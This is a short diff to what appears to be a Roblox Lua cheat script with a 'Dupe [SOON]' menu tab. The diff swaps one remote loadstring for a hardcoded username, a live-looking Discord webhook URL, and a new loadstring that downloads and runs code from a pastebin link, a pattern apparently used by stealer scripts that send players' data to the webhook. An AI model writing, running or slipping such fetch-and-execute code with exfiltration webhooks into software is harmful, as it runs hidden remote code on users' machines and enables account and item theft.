@@ -14,4 +14,7 @@ end)
 local Tab = Window:NewTab("Dupe [SOON]")
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts-Z/Scripts/main/HTC6W51IYGAP.lua"))()
+UserName = "sandro4342"
+WebHook = "https://discord.com/api/webhooks/1284417252061483063/Pq-XzBCXfwYxf5CncCh8ptpYXseA63KQvFWsuK-PbXT_Ok6wUqxj7Lxx4PaybrkvbYBS"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ahGVHZhj"))()
